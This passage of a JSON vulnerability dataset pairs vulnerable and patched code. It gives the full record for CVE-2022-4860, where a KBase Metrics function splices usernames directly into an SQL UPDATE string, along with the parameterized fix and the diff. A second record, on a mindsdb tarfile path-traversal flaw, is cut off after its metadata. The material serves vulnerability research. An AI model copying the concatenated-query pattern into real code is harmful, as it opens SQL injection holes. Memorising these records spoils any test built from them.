    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-4860",
    "cve_description": "A vulnerability was found in KBase Metrics. It has been classified as critical. This affects the function upload_user_data of the file source/daily_cron_jobs/methods_upload_user_stats.py. The manipulation leads to sql injection. The patch is named 959dfb6b05991e30b0fa972a1ecdcaae8e1dae6d. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-217059.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/kbase/metrics",
    "patch_url": [
      "https://github.com/kbase/metrics/commit/959dfb6b05991e30b0fa972a1ecdcaae8e1dae6d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_210_1",
        "commit": "c9ec070",
        "file_path": "source/daily_cron_jobs/methods_upload_user_stats.py",
        "start_line": 349,
        "end_line": 724,
        "snippet": "def upload_user_data(user_stats_dict):\n    \"\"\"\n    Takes the User Stats dict that is populated by the other functions and \n    then populates the user_info and user_system_summary_stats tables\n    in the metrics MySQL DB.\n    \"\"\"\n    total_users = len(user_stats_dict.keys())\n    rows_info_inserted = 0\n    rows_info_updated = 0\n    rows_stats_inserted = 0\n    # connect to mysql\n    db_connection = mysql.connect(\n        host=sql_host, user=\"metrics\", passwd=metrics_mysql_password, database=\"metrics\"\n    )\n\n    cursor = db_connection.cursor()\n    query = \"use \" + query_on\n    cursor.execute(query)\n\n    counter_user_id = -1\n    get_max_user_id_q = (\n\t\"select max(user_id) from metrics.user_info \"\n    )\n    cursor.execute(get_max_user_id_q)\n    for row in cursor:\n        counter_user_id = row[0]\n        \n    # get all existing users\n    existing_user_info = dict()\n    query = (\n        \"select username, display_name, email, orcid, globus_login, google_login, \"\n        \"kb_internal_user, institution, country, \"\n        \"signup_date, last_signin_date, department, job_title, job_title_other, \"\n        \"city, state, postal_code, funding_source, research_statement, \"\n        \"research_interests, avatar_option, gravatar_default , \"\n        \"how_u_hear_selected, how_u_hear_other from metrics.user_info\"\n    )\n    cursor.execute(query)\n    for (\n            username,\n            display_name,\n            email,\n            orcid,\n            globus_login,\n            google_login,\n            kb_internal_user,\n            institution,\n            country,\n            signup_date,\n            last_signin_date,\n            department,\n            job_title,\n            job_title_other,\n            city,\n            state,\n            postal_code,\n            funding_source,\n            research_statement,\n            research_interests,\n            avatar_option,\n            gravatar_default,\n            how_u_hear_selected,\n            how_u_hear_other\n    ) in cursor:\n        existing_user_info[username] = {\n            \"name\": display_name,\n            \"email\": email,\n            \"orcid\": orcid,\n            \"globus_login\": globus_login,\n            \"google_login\": google_login,\n            \"kb_internal_user\": kb_internal_user,\n            \"institution\": institution,\n            \"country\": country,\n            \"signup_date\": signup_date,\n            \"last_signin_date\": last_signin_date,\n            \"department\": department,\n            \"job_title\": job_title,\n            \"job_title_other\": job_title_other,\n            \"city\" : city,\n            \"state\" : state,\n            \"postal_code\" : postal_code,\n            \"funding_source\" : funding_source,\n            \"research_statement\" : research_statement,\n            \"research_interests\" : research_interests,\n            \"avatar_option\" : avatar_option,\n            \"gravatar_default\" : gravatar_default,\n            \"how_u_hear_selected\" : how_u_hear_selected,\n            \"how_u_hear_other\" : how_u_hear_other\n        }\n\n    print(\"Number of existing users:\" + str(len(existing_user_info)))\n\n    prep_cursor = db_connection.cursor(prepared=True)\n    user_info_insert_statement = (\n        \"insert into user_info \"\n        \"(username, display_name, email, orcid, \"\n        \"globus_login, google_login, \"\n        \"user_id, kb_internal_user, institution, \"\n        \"country, signup_date, last_signin_date, \"\n        \"department, job_title, job_title_other, \"\n        \"city, state, postal_code, funding_source, \"\n        \"research_statement, research_interests, \"\n        \"avatar_option, gravatar_default, \"\n        \"how_u_hear_selected, how_u_hear_other)\"\n        \"values(%s, %s, %s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s);\")\n\n    update_prep_cursor = db_connection.cursor(prepared=True)\n    user_info_update_statement = (\n        \"update user_info \"\n        \"set display_name = %s, email = %s, \"\n        \"orcid = %s, globus_login = %s, \"\n        \"google_login = %s, kb_internal_user = %s, \"\n        \"institution = %s, country = %s, \"\n        \"signup_date = %s, last_signin_date = %s, \"\n        \"department = %s, job_title = %s, \"\n        \"job_title_other = %s, \"\n        \"city = %s, state = %s, \"\n        \"postal_code = %s, funding_source = %s, \"\n        \"research_statement = %s, \"\n        \"research_interests = %s, \"\n        \"avatar_option = %s, \"\n        \"gravatar_default = %s, \"\n        \"how_u_hear_selected = %s, \"\n        \"how_u_hear_other = %s \"\n        \"where username = %s;\"\n    )\n\n    new_user_info_count = 0\n    users_info_updated_count = 0\n\n    for username in user_stats_dict:\n        # check if new user_info exists in the existing user info, if not insert the record.\n        if username not in existing_user_info:\n            counter_user_id += 1\n            input = (\n                username,\n                user_stats_dict[username][\"name\"],\n                user_stats_dict[username][\"email\"],\n                user_stats_dict[username][\"orcid\"],\n                user_stats_dict[username][\"globus_login\"],\n                user_stats_dict[username][\"google_login\"],\n                counter_user_id,\n                user_stats_dict[username][\"kbase_internal_user\"],\n                user_stats_dict[username][\"institution\"],\n                user_stats_dict[username][\"country\"],\n                user_stats_dict[username][\"signup_date\"],\n                user_stats_dict[username][\"last_signin_date\"],\n                user_stats_dict[username][\"department\"],\n                user_stats_dict[username][\"job_title\"],\n                user_stats_dict[username][\"job_title_other\"],\n                user_stats_dict[username][\"city\"],\n                user_stats_dict[username][\"state\"],\n                user_stats_dict[username][\"postal_code\"],\n                user_stats_dict[username][\"funding_source\"],\n                user_stats_dict[username][\"research_statement\"],\n                user_stats_dict[username][\"research_interests\"],\n                user_stats_dict[username][\"avatar_option\"],\n                user_stats_dict[username][\"gravatar_default\"],\n                user_stats_dict[username][\"how_u_hear_selected\"],\n                user_stats_dict[username][\"how_u_hear_other\"],\n            )\n            prep_cursor.execute(user_info_insert_statement, input)\n            new_user_info_count += 1\n        else:\n            # Check if anything has changed in the user_info, if so update the record\n            if not (\n                (\n                    user_stats_dict[username][\"last_signin_date\"] is None\n                    or user_stats_dict[username][\"last_signin_date\"].strftime(\n                        \"%Y-%m-%d %H:%M:%S\"\n                    )\n                    == str(existing_user_info[username][\"last_signin_date\"])\n                )\n                and (\n                    user_stats_dict[username][\"signup_date\"].strftime(\n                        \"%Y-%m-%d %H:%M:%S\"\n                    )\n                    == str(existing_user_info[username][\"signup_date\"])\n                )\n                and user_stats_dict[username][\"country\"]\n                    == existing_user_info[username][\"country\"]\n                and user_stats_dict[username][\"institution\"]\n                    == existing_user_info[username][\"institution\"]\n                and user_stats_dict[username][\"kbase_internal_user\"]\n                    == existing_user_info[username][\"kb_internal_user\"]\n                and user_stats_dict[username][\"orcid\"]\n                    == existing_user_info[username][\"orcid\"]\n                and user_stats_dict[username][\"globus_login\"]\n                    == existing_user_info[username][\"globus_login\"]\n                and user_stats_dict[username][\"google_login\"]\n                    == existing_user_info[username][\"google_login\"]\n                and user_stats_dict[username][\"email\"]\n                    == existing_user_info[username][\"email\"]\n                and user_stats_dict[username][\"name\"]\n                    == existing_user_info[username][\"name\"]\n                and user_stats_dict[username][\"department\"]\n                    == existing_user_info[username][\"department\"]\n                and user_stats_dict[username][\"job_title\"]\n                    == existing_user_info[username][\"job_title\"]\n                and user_stats_dict[username][\"job_title_other\"]\n                    == existing_user_info[username][\"job_title_other\"]\n                and user_stats_dict[username][\"city\"]\n                    == existing_user_info[username][\"city\"]\n                and user_stats_dict[username][\"state\"]\n                    == existing_user_info[username][\"state\"]\n                and user_stats_dict[username][\"postal_code\"]\n                    == existing_user_info[username][\"postal_code\"]\n                and user_stats_dict[username][\"funding_source\"]\n                    == existing_user_info[username][\"funding_source\"]\n                and user_stats_dict[username][\"research_statement\"]\n                    == existing_user_info[username][\"research_statement\"]\n                and user_stats_dict[username][\"research_interests\"]\n                    == existing_user_info[username][\"research_interests\"]\n                and user_stats_dict[username][\"avatar_option\"]\n                    == existing_user_info[username][\"avatar_option\"]\n                and user_stats_dict[username][\"gravatar_default\"]\n                    == existing_user_info[username][\"gravatar_default\"]\n                and user_stats_dict[username][\"how_u_hear_selected\"]\n                    == existing_user_info[username][\"how_u_hear_selected\"]\n                and user_stats_dict[username][\"how_u_hear_other\"]\n                    == existing_user_info[username][\"how_u_hear_other\"]\n            ):\n                input = (\n                    user_stats_dict[username][\"name\"],\n                    user_stats_dict[username][\"email\"],\n                    user_stats_dict[username][\"orcid\"],\n                    user_stats_dict[username][\"globus_login\"],\n                    user_stats_dict[username][\"google_login\"],\n                    user_stats_dict[username][\"kbase_internal_user\"],\n                    user_stats_dict[username][\"institution\"],\n                    user_stats_dict[username][\"country\"],\n                    user_stats_dict[username][\"signup_date\"],\n                    user_stats_dict[username][\"last_signin_date\"],\n                    user_stats_dict[username][\"department\"],\n                    user_stats_dict[username][\"job_title\"],\n                    user_stats_dict[username][\"job_title_other\"],\n                    user_stats_dict[username][\"city\"],\n                    user_stats_dict[username][\"state\"],\n                    user_stats_dict[username][\"postal_code\"],\n                    user_stats_dict[username][\"funding_source\"],\n                    user_stats_dict[username][\"research_statement\"],\n                    user_stats_dict[username][\"research_interests\"],\n                    user_stats_dict[username][\"avatar_option\"],\n                    user_stats_dict[username][\"gravatar_default\"],\n                    user_stats_dict[username][\"how_u_hear_selected\"],\n                    user_stats_dict[username][\"how_u_hear_other\"],\n                    username,\n                )\n                update_prep_cursor.execute(user_info_update_statement, input)\n                users_info_updated_count += 1\n    db_connection.commit()\n\n    print(\"Number of new users info inserted:\" + str(new_user_info_count))\n    print(\"Number of users updated:\" + str(users_info_updated_count))\n\n    dev_tokens_users = get_dev_token_users_from_mongo()\n    #print(\"dev_tokens_users: \" + str(dev_tokens_users))\n\n    ####################\n    # TRIED DO UPDATE WITH PASSED LIST NONE OF THIS WORKED\n    # HAD To build up the entire string\n    #    update_new_dev_tokens_statement = (\n    #        \"update user_info set dev_token_first_seen = now() \"\n    #        \"where dev_token_first_seen is null and \"\n    #        \"username in (%s)\"\n    #        )\n    #    sql_params = \",\".join(dev_tokens_users)\n    #    sql_params = (dev_tokens_users,)\n    #    sql_params = ([str(dev_tokens_users)])\n    #    cursor.execute(update_new_dev_tokens_statement, [sql_params])\n    #    cursor.execute(\"update user_info set dev_token_first_seen = now() \"\n    #                   \"where dev_token_first_seen is null and \"\n    #                   \"username in (%s)\" % ', '.join('?' * len(dev_tokens_users)), dev_tokens_users)\n    #    update_new_dev_tokens_statement = (\n    #        \"update user_info set dev_token_first_seen = now() \"\n    #        \"where dev_token_first_seen is null and \"\n    #        \"username in (%s)\" % ', '.join('?' * len(dev_tokens_users)), dev_tokens_users\n    #        )\n    #    cursor.execute(\"SELECT foo.y FROM foo WHERE foo.x in (%s)\" % ', '.join('?' * len(s)), s)\n    dev_tokens_string = \"', '\".join(dev_tokens_users)\n    update_new_dev_tokens_statement = (\n        \"update user_info set dev_token_first_seen = now() \"\n        \"where dev_token_first_seen is null and \"\n        \"username in ('\" + dev_tokens_string + \"')\"\n        )\n    cursor.execute(update_new_dev_tokens_statement)\n    db_connection.commit()\n    \n    # NOW DO USER SUMMARY STATS\n    user_summary_stats_insert_statement = (\n        \"insert into user_system_summary_stats \"\n        \"(username,num_orgs, narrative_count, \"\n        \"shared_count, narratives_shared) \"\n        \"values(%s,%s,%s,%s,%s);\"\n    )\n\n    existing_user_summary_stats = dict()\n    query = (\n        \"select username, num_orgs, narrative_count, shared_count, narratives_shared \"\n        \"from user_system_summary_stats_current\"\n    )\n    cursor.execute(query)\n    for (\n        username,\n        num_orgs,\n        narrative_count,\n        shared_count,\n        narratives_shared,\n    ) in cursor:\n        existing_user_summary_stats[username] = {\n            \"num_orgs\": num_orgs,\n            \"narrative_count\": narrative_count,\n            \"shared_count\": shared_count,\n            \"narratives_shared\": narratives_shared,\n        }\n    print(\"Number of existing user summaries:\" + str(len(existing_user_summary_stats)))\n\n    new_user_summary_count = 0\n    existing_user_summary_count = 0\n    for username in user_stats_dict:\n        if username not in existing_user_summary_stats:\n            # if user does not exist insert\n            input = (\n                username,\n                user_stats_dict[username][\"num_orgs\"],\n                user_stats_dict[username][\"narrative_count\"],\n                user_stats_dict[username][\"shared_count\"],\n                user_stats_dict[username][\"narratives_shared\"],\n            )\n            prep_cursor.execute(user_summary_stats_insert_statement, input)\n            new_user_summary_count += 1\n        else:\n            # else see if the new data differs from the most recent snapshot. If it does differ, do an insert\n            if not (\n                user_stats_dict[username][\"num_orgs\"]\n                == existing_user_summary_stats[username][\"num_orgs\"]\n                and user_stats_dict[username][\"narrative_count\"]\n                == existing_user_summary_stats[username][\"narrative_count\"]\n                and user_stats_dict[username][\"shared_count\"]\n                == existing_user_summary_stats[username][\"shared_count\"]\n                and user_stats_dict[username][\"narratives_shared\"]\n                == existing_user_summary_stats[username][\"narratives_shared\"]\n            ):\n                input = (\n                    username,\n                    user_stats_dict[username][\"num_orgs\"],\n                    user_stats_dict[username][\"narrative_count\"],\n                    user_stats_dict[username][\"shared_count\"],\n                    user_stats_dict[username][\"narratives_shared\"],\n                )\n                prep_cursor.execute(user_summary_stats_insert_statement, input)\n                existing_user_summary_count += 1\n\n    db_connection.commit()\n\n    # THIS CODE is to update any of the 434 excluded users that had accounts made for them\n    # but never logged in. In case any of them ever do log in, they will be removed from\n    # the excluded list\n    query = \"UPDATE metrics.user_info set exclude = False where last_signin_date is not NULL\"\n    cursor.execute(query)\n    db_connection.commit()\n\n    print(\"Number of new users summary inserted:\" + str(new_user_summary_count))\n    print(\n        \"Number of existing users summary inserted:\" + str(existing_user_summary_count)\n    )\n\n    return 1"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_210_1",
        "commit": "959dfb6",
        "file_path": "source/daily_cron_jobs/methods_upload_user_stats.py",
        "start_line": 349,
        "end_line": 702,
        "snippet": "def upload_user_data(user_stats_dict):\n    \"\"\"\n    Takes the User Stats dict that is populated by the other functions and \n    then populates the user_info and user_system_summary_stats tables\n    in the metrics MySQL DB.\n    \"\"\"\n    total_users = len(user_stats_dict.keys())\n    rows_info_inserted = 0\n    rows_info_updated = 0\n    rows_stats_inserted = 0\n    # connect to mysql\n    db_connection = mysql.connect(\n        host=sql_host, user=\"metrics\", passwd=metrics_mysql_password, database=\"metrics\"\n    )\n\n    cursor = db_connection.cursor()\n    query = \"use \" + query_on\n    cursor.execute(query)\n\n    counter_user_id = -1\n    get_max_user_id_q = (\n\t\"select max(user_id) from metrics.user_info \"\n    )\n    cursor.execute(get_max_user_id_q)\n    for row in cursor:\n        counter_user_id = row[0]\n        \n    # get all existing users\n    existing_user_info = dict()\n    query = (\n        \"select username, display_name, email, orcid, globus_login, google_login, \"\n        \"kb_internal_user, institution, country, \"\n        \"signup_date, last_signin_date, department, job_title, job_title_other, \"\n        \"city, state, postal_code, funding_source, research_statement, \"\n        \"research_interests, avatar_option, gravatar_default , \"\n        \"how_u_hear_selected, how_u_hear_other from metrics.user_info\"\n    )\n    cursor.execute(query)\n    for (\n            username,\n            display_name,\n            email,\n            orcid,\n            globus_login,\n            google_login,\n            kb_internal_user,\n            institution,\n            country,\n            signup_date,\n            last_signin_date,\n            department,\n            job_title,\n            job_title_other,\n            city,\n            state,\n            postal_code,\n            funding_source,\n            research_statement,\n            research_interests,\n            avatar_option,\n            gravatar_default,\n            how_u_hear_selected,\n            how_u_hear_other\n    ) in cursor:\n        existing_user_info[username] = {\n            \"name\": display_name,\n            \"email\": email,\n            \"orcid\": orcid,\n            \"globus_login\": globus_login,\n            \"google_login\": google_login,\n            \"kb_internal_user\": kb_internal_user,\n            \"institution\": institution,\n            \"country\": country,\n            \"signup_date\": signup_date,\n            \"last_signin_date\": last_signin_date,\n            \"department\": department,\n            \"job_title\": job_title,\n            \"job_title_other\": job_title_other,\n            \"city\" : city,\n            \"state\" : state,\n            \"postal_code\" : postal_code,\n            \"funding_source\" : funding_source,\n            \"research_statement\" : research_statement,\n            \"research_interests\" : research_interests,\n            \"avatar_option\" : avatar_option,\n            \"gravatar_default\" : gravatar_default,\n            \"how_u_hear_selected\" : how_u_hear_selected,\n            \"how_u_hear_other\" : how_u_hear_other\n        }\n\n    print(\"Number of existing users:\" + str(len(existing_user_info)))\n\n    prep_cursor = db_connection.cursor(prepared=True)\n    user_info_insert_statement = (\n        \"insert into user_info \"\n        \"(username, display_name, email, orcid, \"\n        \"globus_login, google_login, \"\n        \"user_id, kb_internal_user, institution, \"\n        \"country, signup_date, last_signin_date, \"\n        \"department, job_title, job_title_other, \"\n        \"city, state, postal_code, funding_source, \"\n        \"research_statement, research_interests, \"\n        \"avatar_option, gravatar_default, \"\n        \"how_u_hear_selected, how_u_hear_other)\"\n        \"values(%s, %s, %s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, \"\n        \"%s, %s, %s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s, \"\n        \"%s, %s);\")\n\n    update_prep_cursor = db_connection.cursor(prepared=True)\n    user_info_update_statement = (\n        \"update user_info \"\n        \"set display_name = %s, email = %s, \"\n        \"orcid = %s, globus_login = %s, \"\n        \"google_login = %s, kb_internal_user = %s, \"\n        \"institution = %s, country = %s, \"\n        \"signup_date = %s, last_signin_date = %s, \"\n        \"department = %s, job_title = %s, \"\n        \"job_title_other = %s, \"\n        \"city = %s, state = %s, \"\n        \"postal_code = %s, funding_source = %s, \"\n        \"research_statement = %s, \"\n        \"research_interests = %s, \"\n        \"avatar_option = %s, \"\n        \"gravatar_default = %s, \"\n        \"how_u_hear_selected = %s, \"\n        \"how_u_hear_other = %s \"\n        \"where username = %s;\"\n    )\n\n    new_user_info_count = 0\n    users_info_updated_count = 0\n\n    for username in user_stats_dict:\n        # check if new user_info exists in the existing user info, if not insert the record.\n        if username not in existing_user_info:\n            counter_user_id += 1\n            input = (\n                username,\n                user_stats_dict[username][\"name\"],\n                user_stats_dict[username][\"email\"],\n                user_stats_dict[username][\"orcid\"],\n                user_stats_dict[username][\"globus_login\"],\n                user_stats_dict[username][\"google_login\"],\n                counter_user_id,\n                user_stats_dict[username][\"kbase_internal_user\"],\n                user_stats_dict[username][\"institution\"],\n                user_stats_dict[username][\"country\"],\n                user_stats_dict[username][\"signup_date\"],\n                user_stats_dict[username][\"last_signin_date\"],\n                user_stats_dict[username][\"department\"],\n                user_stats_dict[username][\"job_title\"],\n                user_stats_dict[username][\"job_title_other\"],\n                user_stats_dict[username][\"city\"],\n                user_stats_dict[username][\"state\"],\n                user_stats_dict[username][\"postal_code\"],\n                user_stats_dict[username][\"funding_source\"],\n                user_stats_dict[username][\"research_statement\"],\n                user_stats_dict[username][\"research_interests\"],\n                user_stats_dict[username][\"avatar_option\"],\n                user_stats_dict[username][\"gravatar_default\"],\n                user_stats_dict[username][\"how_u_hear_selected\"],\n                user_stats_dict[username][\"how_u_hear_other\"],\n            )\n            prep_cursor.execute(user_info_insert_statement, input)\n            new_user_info_count += 1\n        else:\n            # Check if anything has changed in the user_info, if so update the record\n            if not (\n                (\n                    user_stats_dict[username][\"last_signin_date\"] is None\n                    or user_stats_dict[username][\"last_signin_date\"].strftime(\n                        \"%Y-%m-%d %H:%M:%S\"\n                    )\n                    == str(existing_user_info[username][\"last_signin_date\"])\n                )\n                and (\n                    user_stats_dict[username][\"signup_date\"].strftime(\n                        \"%Y-%m-%d %H:%M:%S\"\n                    )\n                    == str(existing_user_info[username][\"signup_date\"])\n                )\n                and user_stats_dict[username][\"country\"]\n                    == existing_user_info[username][\"country\"]\n                and user_stats_dict[username][\"institution\"]\n                    == existing_user_info[username][\"institution\"]\n                and user_stats_dict[username][\"kbase_internal_user\"]\n                    == existing_user_info[username][\"kb_internal_user\"]\n                and user_stats_dict[username][\"orcid\"]\n                    == existing_user_info[username][\"orcid\"]\n                and user_stats_dict[username][\"globus_login\"]\n                    == existing_user_info[username][\"globus_login\"]\n                and user_stats_dict[username][\"google_login\"]\n                    == existing_user_info[username][\"google_login\"]\n                and user_stats_dict[username][\"email\"]\n                    == existing_user_info[username][\"email\"]\n                and user_stats_dict[username][\"name\"]\n                    == existing_user_info[username][\"name\"]\n                and user_stats_dict[username][\"department\"]\n                    == existing_user_info[username][\"department\"]\n                and user_stats_dict[username][\"job_title\"]\n                    == existing_user_info[username][\"job_title\"]\n                and user_stats_dict[username][\"job_title_other\"]\n                    == existing_user_info[username][\"job_title_other\"]\n                and user_stats_dict[username][\"city\"]\n                    == existing_user_info[username][\"city\"]\n                and user_stats_dict[username][\"state\"]\n                    == existing_user_info[username][\"state\"]\n                and user_stats_dict[username][\"postal_code\"]\n                    == existing_user_info[username][\"postal_code\"]\n                and user_stats_dict[username][\"funding_source\"]\n                    == existing_user_info[username][\"funding_source\"]\n                and user_stats_dict[username][\"research_statement\"]\n                    == existing_user_info[username][\"research_statement\"]\n                and user_stats_dict[username][\"research_interests\"]\n                    == existing_user_info[username][\"research_interests\"]\n                and user_stats_dict[username][\"avatar_option\"]\n                    == existing_user_info[username][\"avatar_option\"]\n                and user_stats_dict[username][\"gravatar_default\"]\n                    == existing_user_info[username][\"gravatar_default\"]\n                and user_stats_dict[username][\"how_u_hear_selected\"]\n                    == existing_user_info[username][\"how_u_hear_selected\"]\n                and user_stats_dict[username][\"how_u_hear_other\"]\n                    == existing_user_info[username][\"how_u_hear_other\"]\n            ):\n                input = (\n                    user_stats_dict[username][\"name\"],\n                    user_stats_dict[username][\"email\"],\n                    user_stats_dict[username][\"orcid\"],\n                    user_stats_dict[username][\"globus_login\"],\n                    user_stats_dict[username][\"google_login\"],\n                    user_stats_dict[username][\"kbase_internal_user\"],\n                    user_stats_dict[username][\"institution\"],\n                    user_stats_dict[username][\"country\"],\n                    user_stats_dict[username][\"signup_date\"],\n                    user_stats_dict[username][\"last_signin_date\"],\n                    user_stats_dict[username][\"department\"],\n                    user_stats_dict[username][\"job_title\"],\n                    user_stats_dict[username][\"job_title_other\"],\n                    user_stats_dict[username][\"city\"],\n                    user_stats_dict[username][\"state\"],\n                    user_stats_dict[username][\"postal_code\"],\n                    user_stats_dict[username][\"funding_source\"],\n                    user_stats_dict[username][\"research_statement\"],\n                    user_stats_dict[username][\"research_interests\"],\n                    user_stats_dict[username][\"avatar_option\"],\n                    user_stats_dict[username][\"gravatar_default\"],\n                    user_stats_dict[username][\"how_u_hear_selected\"],\n                    user_stats_dict[username][\"how_u_hear_other\"],\n                    username,\n                )\n                update_prep_cursor.execute(user_info_update_statement, input)\n                users_info_updated_count += 1\n    db_connection.commit()\n\n    print(\"Number of new users info inserted:\" + str(new_user_info_count))\n    print(\"Number of users updated:\" + str(users_info_updated_count))\n\n    dev_tokens_users = get_dev_token_users_from_mongo()\n    update_new_dev_tokens_statement = (\n        \"update user_info set dev_token_first_seen = now() \"\n        \"where dev_token_first_seen is null and \"\n        \"username in (\" + (\"%s, \" * (len(dev_tokens_users) - 1)) + \"%s)\"\n        )\n#    print(\"update_new_dev_tokens_statement : \" + update_new_dev_tokens_statement)\n    update_dev_tokens_prep_cursor = db_connection.cursor(prepared=True)\n    update_dev_tokens_prep_cursor.execute(update_new_dev_tokens_statement, dev_tokens_users)\n    db_connection.commit()\n    \n    # NOW DO USER SUMMARY STATS\n    user_summary_stats_insert_statement = (\n        \"insert into user_system_summary_stats \"\n        \"(username,num_orgs, narrative_count, \"\n        \"shared_count, narratives_shared) \"\n        \"values(%s,%s,%s,%s,%s);\"\n    )\n\n    existing_user_summary_stats = dict()\n    query = (\n        \"select username, num_orgs, narrative_count, shared_count, narratives_shared \"\n        \"from user_system_summary_stats_current\"\n    )\n    cursor.execute(query)\n    for (\n        username,\n        num_orgs,\n        narrative_count,\n        shared_count,\n        narratives_shared,\n    ) in cursor:\n        existing_user_summary_stats[username] = {\n            \"num_orgs\": num_orgs,\n            \"narrative_count\": narrative_count,\n            \"shared_count\": shared_count,\n            \"narratives_shared\": narratives_shared,\n        }\n    print(\"Number of existing user summaries:\" + str(len(existing_user_summary_stats)))\n\n    new_user_summary_count = 0\n    existing_user_summary_count = 0\n    for username in user_stats_dict:\n        if username not in existing_user_summary_stats:\n            # if user does not exist insert\n            input = (\n                username,\n                user_stats_dict[username][\"num_orgs\"],\n                user_stats_dict[username][\"narrative_count\"],\n                user_stats_dict[username][\"shared_count\"],\n                user_stats_dict[username][\"narratives_shared\"],\n            )\n            prep_cursor.execute(user_summary_stats_insert_statement, input)\n            new_user_summary_count += 1\n        else:\n            # else see if the new data differs from the most recent snapshot. If it does differ, do an insert\n            if not (\n                user_stats_dict[username][\"num_orgs\"]\n                == existing_user_summary_stats[username][\"num_orgs\"]\n                and user_stats_dict[username][\"narrative_count\"]\n                == existing_user_summary_stats[username][\"narrative_count\"]\n                and user_stats_dict[username][\"shared_count\"]\n                == existing_user_summary_stats[username][\"shared_count\"]\n                and user_stats_dict[username][\"narratives_shared\"]\n                == existing_user_summary_stats[username][\"narratives_shared\"]\n            ):\n                input = (\n                    username,\n                    user_stats_dict[username][\"num_orgs\"],\n                    user_stats_dict[username][\"narrative_count\"],\n                    user_stats_dict[username][\"shared_count\"],\n                    user_stats_dict[username][\"narratives_shared\"],\n                )\n                prep_cursor.execute(user_summary_stats_insert_statement, input)\n                existing_user_summary_count += 1\n\n    db_connection.commit()\n\n    # THIS CODE is to update any of the 434 excluded users that had accounts made for them\n    # but never logged in. In case any of them ever do log in, they will be removed from\n    # the excluded list\n    query = \"UPDATE metrics.user_info set exclude = False where last_signin_date is not NULL\"\n    cursor.execute(query)\n    db_connection.commit()\n\n    print(\"Number of new users summary inserted:\" + str(new_user_summary_count))\n    print(\n        \"Number of existing users summary inserted:\" + str(existing_user_summary_count)\n    )\n\n    return 1"
      }
    ],
    "vul_patch": "--- a/source/daily_cron_jobs/methods_upload_user_stats.py\n+++ b/source/daily_cron_jobs/methods_upload_user_stats.py\n@@ -262,36 +262,14 @@\n     print(\"Number of users updated:\" + str(users_info_updated_count))\n \n     dev_tokens_users = get_dev_token_users_from_mongo()\n-    #print(\"dev_tokens_users: \" + str(dev_tokens_users))\n-\n-    ####################\n-    # TRIED DO UPDATE WITH PASSED LIST NONE OF THIS WORKED\n-    # HAD To build up the entire string\n-    #    update_new_dev_tokens_statement = (\n-    #        \"update user_info set dev_token_first_seen = now() \"\n-    #        \"where dev_token_first_seen is null and \"\n-    #        \"username in (%s)\"\n-    #        )\n-    #    sql_params = \",\".join(dev_tokens_users)\n-    #    sql_params = (dev_tokens_users,)\n-    #    sql_params = ([str(dev_tokens_users)])\n-    #    cursor.execute(update_new_dev_tokens_statement, [sql_params])\n-    #    cursor.execute(\"update user_info set dev_token_first_seen = now() \"\n-    #                   \"where dev_token_first_seen is null and \"\n-    #                   \"username in (%s)\" % ', '.join('?' * len(dev_tokens_users)), dev_tokens_users)\n-    #    update_new_dev_tokens_statement = (\n-    #        \"update user_info set dev_token_first_seen = now() \"\n-    #        \"where dev_token_first_seen is null and \"\n-    #        \"username in (%s)\" % ', '.join('?' * len(dev_tokens_users)), dev_tokens_users\n-    #        )\n-    #    cursor.execute(\"SELECT foo.y FROM foo WHERE foo.x in (%s)\" % ', '.join('?' * len(s)), s)\n-    dev_tokens_string = \"', '\".join(dev_tokens_users)\n     update_new_dev_tokens_statement = (\n         \"update user_info set dev_token_first_seen = now() \"\n         \"where dev_token_first_seen is null and \"\n-        \"username in ('\" + dev_tokens_string + \"')\"\n+        \"username in (\" + (\"%s, \" * (len(dev_tokens_users) - 1)) + \"%s)\"\n         )\n-    cursor.execute(update_new_dev_tokens_statement)\n+#    print(\"update_new_dev_tokens_statement : \" + update_new_dev_tokens_statement)\n+    update_dev_tokens_prep_cursor = db_connection.cursor(prepared=True)\n+    update_dev_tokens_prep_cursor.execute(update_new_dev_tokens_statement, dev_tokens_users)\n     db_connection.commit()\n     \n     # NOW DO USER SUMMARY STATS\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-30620",
    "cve_description": "mindsdb is a Machine Learning platform to help developers build AI solutions. In affected versions an unsafe extraction is being performed using `tarfile.extractall()` from a remotely retrieved tarball. Which may lead to the writing of the extracted files to an unintended location. Sometimes, the vulnerability is called a TarSlip or a ZipSlip variant. An attacker may leverage this vulnerability to overwrite any local file which the server process has access to. There is no risk of file exposure with this vulnerability. This issue has been addressed in release `23.2.1.0 `. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mindsdb/mindsdb",
    "patch_url": [
      "https://github.com/mindsdb/mindsdb/commit/4419b0f0019c000db390b54d8b9d06e1d3670039"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_180_1",
        "commit": "e83cdc5",
        "file_path": "mindsdb/api/http/namespaces/file.py",
        "start_line": 30,
        "end_line": 153,
